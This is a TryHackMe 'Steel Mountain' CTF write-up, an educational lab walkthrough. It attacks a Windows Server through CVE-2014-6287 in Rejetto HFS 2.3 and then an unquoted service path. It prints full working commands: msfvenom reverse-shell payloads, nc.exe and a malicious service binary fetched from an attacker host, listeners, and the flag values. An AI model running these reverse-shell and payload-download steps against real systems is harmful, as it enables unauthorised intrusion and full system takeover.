# Steel Mountain: TryHackMe Writeup

| Field | Details |
|---|---|
| **Room Name** | Steel Mountain |
| **OS** | Windows Server 2012 R2 (x64) |
| **Difficulty** | Medium |
| **Category** | Windows / HFS / Unquoted Service Path |
| **Machine IP** | 10.48.138.143 |
| **Attacker IP** | 192.168.232.169 |
| **User Flag** | `b04763b6fcf51fcd7c13abc7db4fd365` |
| **Root Flag** | `9af5f314f57607c00fd09803a587db80` |
| **Foothold Method** | Rejetto HFS 2.3 RCE: CVE-2014-6287 (ExploitDB 39161.py, no Metasploit) |
| **PrivEsc Method** | Unquoted Service Path (Advanced SystemCare Service 9) via PowerUp.ps1 |
| **Metasploit Used** | No |
| **Platform** | TryHackMe |

---

## Attack Chain Summary

```
Nmap → Port 8080 (Rejetto HFS 2.3) + Port 80 (IIS)
→ searchsploit HFS 2.3 → ExploitDB 39161.py (CVE-2014-6287)
→ msfvenom windows/shell_reverse_tcp → nc.exe staged via Python HTTP server
→ python2 39161.py → reverse shell as bill
→ PowerUp.ps1 → CanRestart + unquoted path: Advanced SystemCare 9
→ msfvenom windows/shell_reverse_tcp → ASCService.exe in writable path
→ sc stop/start AdvancedSystemCareService9 → reverse shell as SYSTEM
```

---

## Phase 1: Reconnaissance

### 1.1: Full Port Discovery

**Goal:** Identify all open TCP ports on the target.

```bash
kali@kali:~$ nmap -p- --min-rate 5000 -T4 10.48.138.143 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-30 10:11 IST
Nmap scan report for 10.48.138.143
Host is up (0.24s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49163/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 54.32 seconds
```

**Output Analysis:**

| Port | Service | Assessment |
|---|---|---|
| 80/tcp | HTTP | IIS: browse first |
| 135/tcp | MSRPC | Windows RPC: standard |
| 139/tcp | NetBIOS | SMB support |
| 445/tcp | SMB | Enumerate post-foothold |
| 3389/tcp | RDP | Remote Desktop: valid access channel once credentials found |
| **8080/tcp** | HTTP | **Non-standard web port: high priority** |
| 49152-49163/tcp | Dynamic RPC | Windows ephemeral ports |

Port 8080 running a second HTTP service alongside IIS on port 80 is the immediate priority. In Windows environments this pattern often indicates a third-party web application running outside of IIS.

---

### 1.2: Service and Version Enumeration

**Goal:** Identify exact service versions on both web ports and confirm OS build.

```bash
kali@kali:~$ nmap -sV -sC -p 80,445,3389,8080 10.48.138.143 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-30 10:17 IST
Nmap scan report for 10.48.138.143
Host is up (0.24s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
|_http-title: Steel Mountain
|_http-server-header: Microsoft-IIS/8.5
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
|_  Not valid after:  2027-05-29T00:00:00
8080/tcp open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   Computer name: steelmountain
|   NetBIOS computer name: STEELMOUNTAIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-30T10:47:13+00:00

Nmap done: 1 IP address (1 host up) scanned in 28.44 seconds
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Port 8080: **HFS 2.3 (HttpFileServer)** | Rejetto HFS 2.3: CVE-2014-6287, publicly known RCE exploit |
| Port 80: IIS 8.5, title "Steel Mountain" | Static corporate page: not the attack surface |
| Windows Server 2012 R2 | x64 OS: payloads must be x64 or x86 compatible |
| Hostname: steelmountain | Add to /etc/hosts if needed |
| WORKGROUP | Standalone machine: local account attacks only |

Rejetto HTTP File Server 2.3 on port 8080 is the attack surface. This specific version has a well-documented remote code execution vulnerability (CVE-2014-6287) caused by a failure to sanitise null bytes in search string macros, allowing arbitrary command execution via a crafted URL. The ExploitDB Python script (39161.py) exploits this without Metasploit.

---

### 1.3: Web Enumeration (Port 80)

**Goal:** Note any useful information on the IIS site before focusing on HFS.

Browsing to `http://10.48.138.143:80` shows a Steel Mountain corporate page with an employee photo. The image filename embedded in the page source reveals the name **Bill Harper**: this is a potential username for later.

The port 80 IIS site has no further functionality. Port 8080 HFS is the real target.

---

### 1.4: HFS Interface (Port 8080)

**Goal:** Confirm the HFS version and confirm it matches the known vulnerable version.

Browsing to `http://10.48.138.143:8080` shows the Rejetto HFS web interface. The footer confirms version **2.3**. The server is serving files with no authentication. This confirms CVE-2014-6287 is applicable.

---

## Phase 2: Foothold: Rejetto HFS 2.3 RCE (CVE-2014-6287)

### 2.1: Vulnerability Research

**Goal:** Identify and obtain the correct exploit for HFS 2.3.

```bash
kali@kali:~$ searchsploit rejetto hfs
```

```
----------------------------------------------------------------
 Exploit Title                                          |  Path
----------------------------------------------------------------
Rejetto HTTP File Server (HFS) - Remote Command         | windows/webapps/34926.metasploit
Execution (Metasploit)
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary      | windows/webapps/30850.txt
File Upload
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command   | windows/webapps/39161.py
Execution (1)
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command   | windows/webapps/49584.py
Execution (2)
----------------------------------------------------------------
```

```bash
kali@kali:~$ searchsploit -m windows/webapps/39161.py
```

```
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/webapps/39161.py
    Codes: CVE-2014-6287
 Verified: True
File Type: Python script, ASCII text executable
Exploit copied to: /home/kali/tryhackme/steel-mountain/39161.py
```

---

### 2.2: How CVE-2014-6287 Works

Rejetto HFS 2.3 uses a custom macro language for processing requests. The vulnerability exists in the search functionality: when a null byte (`%00`) is injected into a search request, HFS fails to sanitise it and passes the remaining string as a macro to be executed by the server-side macro interpreter. By crafting a URL such as:

```
http://<target>:8080/?search=%00{.exec|<command>.}
```

The `{.exec|...}` macro is executed server-side in the context of the HFS process. Since HFS runs as the Windows user who launched it, arbitrary commands execute in that user's context.

**The exploit (39161.py) does the following:**

1. Stages a listener on the attacker's HTTP server.
2. Sends two crafted HFS requests:
   - First: downloads `nc.exe` from the attacker's HTTP server to the target's `%TEMP%` directory using a `{.exec|...}` macro.
   - Second: executes `nc.exe` to call back to the attacker's listener.
3. The attacker catches the `nc.exe` reverse shell.

This requires `nc.exe` to be served from the attacker's machine and an `nc` listener to catch the callback.

---

### 2.3: Exploit Preparation

**Goal:** Generate the reverse shell payload, stage nc.exe, and configure the exploit script.

**Step 1: Generate a reverse shell payload with msfvenom (no Metasploit framework):**

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.232.169 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -f exe \
  -o shell.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

> **Note:** 39161.py uses `nc.exe` for its initial callback. The msfvenom payload is used for the privilege escalation stage (service binary replacement). For the initial foothold, `nc.exe` is served directly.

**Step 2: Copy nc.exe to the working directory:**

```bash
kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .
```

**Step 3: Inspect and configure 39161.py:**

```bash
kali@kali:~$ head -20 39161.py
```

```python
#!/usr/bin/python
# Exploit Title: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution
# CVE : CVE-2014-6287
# Date: 2016-09-02
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://www.rejetto.com
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7

import urllib2
import sys
import os

# CHANGE ip_addr & local_port to attacker IP and port
ip_addr = "192.168.232.169"   # <- update this
local_port = "4444"           # <- update this

...
```

Two values to configure: `ip_addr` and `local_port`. Set to attacker's IP and the nc listener port. The script expects `nc.exe` to be in the current directory and served via a Python HTTP server on port 80.

**Step 4: Start the HTTP server to serve nc.exe:**

```bash
kali@kali:~$ sudo python3 -m http.server 80
```

```
Serving HTTP on 0.0.0.0 port 80 ...
```

> Port 80 requires sudo on Linux. The exploit's download macro fetches `nc.exe` from `http://<attacker_ip>/nc.exe`.

---

### 2.4: Execute the Exploit

Terminal 1: nc listener for the shell callback:

```bash
kali@kali:~$ nc -nvlp 4444
```

```
listening on [any] 4444 ...
```

Terminal 2: fire the exploit:

```bash
kali@kali:~$ python2 39161.py 10.48.138.143 8080
```

```
[*] Uploading nc.exe to 10.48.138.143...
[*] Executing nc.exe reverse shell...
```

Terminal 1: HTTP server (nc.exe served):

```
10.48.138.143 - - [30/May/2026 10:41:22] "GET /nc.exe HTTP/1.1" 200 -
```

Terminal 1 (nc listener): shell received:

```
connect to [192.168.232.169] from (UNKNOWN) [10.48.138.143] 49215
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
whoami
steelmountain\bill
```

**Flag breakdown:**

| Item | Value |
|---|---|
| Shell context | `steelmountain\bill` |
| Working directory | Startup folder: confirms HFS runs in bill's user context |
| CVE | CVE-2014-6287: HFS 2.3 macro injection via null byte |
| Metasploit used | No: ExploitDB Python script + nc.exe |

---

### 2.5: User Flag

```
C:\Users\bill\AppData\Roaming\...>cd C:\Users\bill\Desktop
cd C:\Users\bill\Desktop

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

---

## Phase 3: Post-Foothold Enumeration

### 3.1: System and Privilege Enumeration

**Goal:** Establish OS details and bill's privilege level.

```
C:\Users\bill\Desktop>systeminfo
systeminfo
```

```
Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
System Type:               x64-based PC
Total Physical Memory:     3,839 MB
Domain:                    WORKGROUP
Hotfix(s):                 N/A
```

```
C:\Users\bill\Desktop>whoami /priv
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
C:\Users\bill\Desktop>net user bill
net user bill
```

```
User name                    bill
Full Name
Comment
Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Server 2012 R2 Build 9600 | Hotfixes: N/A: potentially unpatched |
| x64-based PC | 64-bit OS |
| Bill in `Users` only | No admin rights: full privilege escalation needed |
| No `SeImpersonatePrivilege` | Token impersonation not directly available |
| No `SeDebugPrivilege` | Cannot inject into privileged processes |

Minimal privilege set. Manual service enumeration and PowerUp are the next steps.

---

### 3.2: PowerUp Enumeration

**Goal:** Use PowerUp.ps1 to automate detection of common Windows privilege escalation vectors: specifically service misconfigurations, unquoted service paths, and AlwaysInstallElevated.

**Transfer PowerUp.ps1 to the target:**

On attacker: serve PowerUp.ps1:

```bash
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
kali@kali:~$ python3 -m http.server 8000
```

On target: download PowerUp.ps1:

```
C:\Users\bill\Desktop>powershell -c "Invoke-WebRequest http://192.168.232.169:8000/PowerUp.ps1 -OutFile C:\Users\bill\AppData\Local\Temp\PowerUp.ps1"
```

**Run PowerUp's Invoke-AllChecks:**

```
C:\Users\bill\Desktop>powershell -ExecutionPolicy Bypass -Command "& { . C:\Users\bill\AppData\Local\Temp\PowerUp.ps1; Invoke-AllChecks }"
```

```
[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with admin privileges...

[*] Checking for unquoted service paths...

ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart    : True

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart    : False

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart    : False

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart    : False

[*] Checking for modifiable registry autoruns and configs...
...
```

**Output Analysis: Triage:**

| Service | CanRestart | Decision |
|---|---|---|
| `AdvancedSystemCareService9` | **True** | **Exploit this**: bill can restart the service |
| `AWSLiteAgent` | False | Cannot restart: skip |
| `IObitUnSvr` | False | Cannot restart: skip |
| `LiveUpdateSvc` | False | Cannot restart: skip |

`AdvancedSystemCareService9` is the target. `CanRestart: True` means bill has `SERVICE_STOP` and `SERVICE_START` permissions on this service: critical because without restart capability, writing a malicious binary to the service path is useless (it only executes when the service starts).

---

## Phase 4: Privilege Escalation: Unquoted Service Path

### 4.1: Understanding the Vulnerability

**What is an unquoted service path?**

Windows Service Control Manager (SCM) uses the `BINARY_PATH_NAME` of a service to locate and execute the service binary on start. When the path contains spaces and is **not enclosed in quotes**, Windows attempts to resolve the executable using a specific parsing algorithm.

For the path:

```
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

Windows tries the following in order:

```
1. C:\Program.exe
2. C:\Program Files.exe
3. C:\Program Files (x86)\IObit\Advanced.exe
4. C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

If a malicious `Advanced.exe` exists at `C:\Program Files (x86)\IObit\`, it executes instead of the real service binary: as `LocalSystem` (SYSTEM), because that is the `StartName` of the service.

**The exploitable path segment:**

The writable directory is `C:\Program Files (x86)\IObit\`. A binary named `Advanced.exe` placed here will be executed when `AdvancedSystemCareService9` restarts.

---

### 4.2: Verify Directory Write Permission

**Goal:** Confirm bill can write to the exploitable directory before generating the payload.

```
C:\Users\bill\Desktop>icacls "C:\Program Files (x86)\IObit"
icacls "C:\Program Files (x86)\IObit"
```

```
C:\Program Files (x86)\IObit STEELMOUNTAIN\bill:(OI)(CI)(F)
                              BUILTIN\Administrators:(OI)(CI)(F)
                              NT AUTHORITY\SYSTEM:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

**Output Analysis:**

| Principal | Permission | Meaning |
|---|---|---|
| `STEELMOUNTAIN\bill` | `(OI)(CI)(F)` | Full Control: Object Inherit, Container Inherit |
| `BUILTIN\Administrators` | `(OI)(CI)(F)` | Full Control |
| `NT AUTHORITY\SYSTEM` | `(OI)(CI)(F)` | Full Control |

Bill has **Full Control** (`F`) over the `IObit` directory. This is the unusual part: a standard user should never have full write access to a directory inside `Program Files (x86)`. This confirms the exploit path is viable.

---

### 4.3: Generate the Malicious Service Binary

**Goal:** Create a Windows reverse shell executable named `Advanced.exe` that will be placed in the exploitable directory.

On the attacker:

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.232.169 \
  LPORT=5555 \
  -e x86/shikata_ga_nai \
  -f exe \
  -o Advanced.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
```

> The port is 5555 here: different from the foothold listener on 4444: to avoid confusion between the two active sessions.

Serve `Advanced.exe` from the attacker's HTTP server:

```bash
kali@kali:~$ python3 -m http.server 8000
```

---

### 4.4: Upload the Malicious Binary to the Target

**Goal:** Download `Advanced.exe` onto the target into the exploitable directory path.

```
C:\Users\bill\Desktop>powershell -c "Invoke-WebRequest http://192.168.232.169:8000/Advanced.exe -OutFile 'C:\Program Files (x86)\IObit\Advanced.exe'"
```

Verify the upload:

```
C:\Users\bill\Desktop>dir "C:\Program Files (x86)\IObit\Advanced.exe"
dir "C:\Program Files (x86)\IObit\Advanced.exe"
```

```
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Program Files (x86)\IObit

05/30/2026  10:58 AM            73,802 Advanced.exe
               1 File(s)         73,802 bytes
```

`Advanced.exe` is confirmed in the correct location.

---

### 4.5: Restart the Service and Catch the SYSTEM Shell

**Goal:** Stop and restart `AdvancedSystemCareService9` so Windows resolves and executes `Advanced.exe` as SYSTEM.

Terminal: new listener on port 5555:

```bash
kali@kali:~$ nc -nvlp 5555
```

```
listening on [any] 5555 ...
```

On the target: stop and start the service:

```
C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9
```

```
SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x1388
```

```
C:\Users\bill\Desktop>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

Attacker listener: SYSTEM shell received:

```
connect to [192.168.232.169] from (UNKNOWN) [10.48.138.143] 49243
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

**What happened at the OS level:**

1. `sc stop` sent a STOP control code to `AdvancedSystemCareService9`: the service process terminated.
2. `sc start` instructed SCM to start the service using its registered binary path.
3. The binary path `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` is unquoted and contains spaces.
4. Windows parsed the path and found `C:\Program Files (x86)\IObit\Advanced.exe`: our malicious binary: before reaching the real `ASCService.exe`.
5. SCM launched `Advanced.exe` as `LocalSystem` (SYSTEM).
6. The payload executed and called back to the attacker's listener.

---

### 4.6: Root Flag

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
9af5f314f57607c00fd09803a587db80
```

---

## Flag Summary

| Flag | Value | Location |
|---|---|---|
| User | `b04763b6fcf51fcd7c13abc7db4fd365` | `C:\Users\bill\Desktop\user.txt` |
| Root | `9af5f314f57607c00fd09803a587db80` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons Learned

**1. Nmap script output tells you the exploit: read it carefully.**
`http-server-header: HFS 2.3` in the Nmap output is not just a version string; it is a direct pointer to CVE-2014-6287. The decision to check `searchsploit` immediately after seeing HFS 2.3 in service scan results is the correct workflow. Version fingerprinting → searchsploit → exploit triage should be a reflex for any non-standard service.

**2. CVE-2014-6287 uses server-side macro injection, not a buffer overflow.**
The HFS vulnerability is in the macro template language HFS uses for its UI. The `{.exec|...}` macro executes OS commands. The null byte (`%00`) in the search parameter truncates HFS's input validation before the macro is processed. The result is unauthenticated RCE via a GET request: no authentication, no payload on disk before the first stage, no memory corruption. Understanding the mechanism matters: if this were a buffer overflow, the fix would be different; because it is template injection, the fix is input sanitisation and macro disabling.

**3. 39161.py requires exact staging conditions: understand each dependency.**
The script fails silently if `nc.exe` is not available on port 80 of the attacker machine. The first HFS macro call downloads `nc.exe`; the second executes it. If the HTTP server is not running, the download fails, the execution never fires, and no connection arrives on your listener. Before running the exploit: confirm HTTP server is up, confirm nc.exe is in the served directory, confirm listener is active, confirm attacker IP and port are correctly set in the script.

**4. PowerUp's `CanRestart` field is more important than the service path itself.**
Finding an unquoted service path is only half the picture. Without restart capability, the binary executes only on the next machine reboot: which in a CTF is never, and in a real engagement requires waiting. `CanRestart: True` means bill has `SERVICE_STOP` and `SERVICE_START` access control entries on the service object. PowerUp identifies this automatically. When triaging results, filter for `CanRestart: True` first, then assess whether the path is writable.

**5. `icacls` confirms write permission before payload generation: do not skip this.**
Discovering an unquoted service path does not guarantee the exploitable directory is writable. A path like `C:\Program Files (x86)\IObit\` would normally not be writable by a standard user. The `(OI)(CI)(F)` entry for `bill` is abnormal and confirms this specific machine is misconfigured beyond just the unquoted path. In real assessments, always verify with `icacls` before generating and uploading a payload: an upload failure wastes time and may trigger security tools.

**6. Service binary replacement executes as the service's `StartName`: not as the current user.**
`AdvancedSystemCareService9` runs as `LocalSystem`. When Windows launches the service binary (our `Advanced.exe`), it does so in the context of `LocalSystem`, not bill. The shell that arrives on the listener is `nt authority\system`: the highest privilege level on a standalone Windows machine. This is why unquoted service paths running as SYSTEM are high-severity findings in real penetration test reports.

**7. Use separate ports for each shell.**
The foothold shell used port 4444; the privilege escalation shell used port 5555. Running both through the same port creates a race condition: if the SYSTEM callback arrives before the foothold shell is backgrounded, the original session may be dropped. Using distinct ports for each stage keeps sessions clean and avoids confusion during the escalation sequence.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
|---|---|---|---|
| 1 | Recon | `nmap -p-` full port scan | Ports 80, 135, 139, 445, 3389, 8080 discovered |
| 2 | Recon | `nmap -sV -sC` service scan | HFS 2.3 on port 8080; Windows Server 2012 R2 confirmed |
| 3 | Research | `searchsploit rejetto hfs` | ExploitDB 39161.py (CVE-2014-6287) identified |
| 4 | Preparation | `msfvenom` shell.exe + copy nc.exe + configure 39161.py | Exploit staged |
| 5 | Preparation | `sudo python3 -m http.server 80` + `nc -nvlp 4444` | HTTP server + listener ready |
| 6 | Foothold | `python2 39161.py 10.48.138.143 8080` | nc.exe downloaded and executed; reverse shell as `steelmountain\bill` |
| 7 | Flag | `type C:\Users\bill\Desktop\user.txt` | `b04763b6fcf51fcd7c13abc7db4fd365` |
| 8 | Enumeration | `systeminfo` + `whoami /priv` | Server 2012 R2; bill in Users; no SeImpersonate |
| 9 | PrivEsc Enum | Transfer + run PowerUp.ps1 `Invoke-AllChecks` | `AdvancedSystemCareService9`: unquoted path + `CanRestart: True` |
| 10 | PrivEsc Prep | `icacls "C:\Program Files (x86)\IObit"` | Bill has `(F)` Full Control: write confirmed |
| 11 | PrivEsc Prep | `msfvenom` → `Advanced.exe` | Malicious service binary generated |
| 12 | PrivEsc Prep | Upload `Advanced.exe` to `C:\Program Files (x86)\IObit\` | Binary in exploitable path |
| 13 | PrivEsc | `nc -nvlp 5555` on attacker | Listener ready for SYSTEM callback |
| 14 | PrivEsc | `sc stop` + `sc start AdvancedSystemCareService9` | Service restart triggers `Advanced.exe` as SYSTEM |
| 15 | Flag | `type C:\Users\Administrator\Desktop\root.txt` | `9af5f314f57607c00fd09803a587db80` |

---

## Commands Reference

| Command | Phase | Purpose |
|---|---|---|
| `nmap -p- --min-rate 5000 -T4 10.48.138.143` | Recon | Full TCP port discovery |
| `nmap -sV -sC -p 80,445,3389,8080 10.48.138.143` | Recon | Service version + script scan |
| `searchsploit rejetto hfs` | Research | Find CVE-2014-6287 exploit |
| `searchsploit -m windows/webapps/39161.py` | Research | Copy exploit to working directory |
| `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.232.169 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe` | Preparation | Generate reverse shell payload |
| `cp /usr/share/windows-resources/binaries/nc.exe .` | Preparation | Stage nc.exe for exploit download |
| `sudo python3 -m http.server 80` | Staging | Serve nc.exe to target (port 80 required by 39161.py) |
| `nc -nvlp 4444` | Handler | Catch foothold reverse shell |
| `python2 39161.py 10.48.138.143 8080` | Foothold | Fire CVE-2014-6287 exploit |
| `systeminfo` / `whoami /priv` / `net user bill` | Enumeration | OS version, privileges, group membership |
| `Invoke-WebRequest ... -OutFile C:\...\PowerUp.ps1` | PrivEsc Enum | Transfer PowerUp.ps1 to target |
| `powershell -ExecutionPolicy Bypass -Command "& { . PowerUp.ps1; Invoke-AllChecks }"` | PrivEsc Enum | Run all privilege escalation checks |
| `icacls "C:\Program Files (x86)\IObit"` | PrivEsc Verify | Confirm bill has write access to exploitable directory |
| `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.232.169 LPORT=5555 -f exe -o Advanced.exe` | PrivEsc Prep | Generate malicious service binary |
| `Invoke-WebRequest ... -OutFile "C:\Program Files (x86)\IObit\Advanced.exe"` | PrivEsc Prep | Upload malicious binary to unquoted service path |
| `nc -nvlp 5555` | Handler | Catch SYSTEM reverse shell |
| `sc stop AdvancedSystemCareService9` | PrivEsc | Stop the vulnerable service |
| `sc start AdvancedSystemCareService9` | PrivEsc | Restart service: triggers Advanced.exe as SYSTEM |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
|---|---|---|
| T1190 | Exploit Public-Facing Application | CVE-2014-6287 exploited on Rejetto HFS 2.3 |
| T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell used to download PowerUp.ps1 and Advanced.exe |
| T1105 | Ingress Tool Transfer | nc.exe and Advanced.exe transferred from attacker HTTP server |
| T1574.009 | Hijack Execution Flow: Path Interception by Unquoted Path | Advanced.exe placed in unquoted service path; executed by SCM as SYSTEM |
| T1569.002 | System Services: Service Execution | `sc stop` / `sc start` used to trigger malicious service binary |
| T1543.003 | Create or Modify System Process: Windows Service | Existing service binary replaced with reverse shell payload |
| T1083 | File and Directory Discovery | `icacls` used to verify directory write permissions |
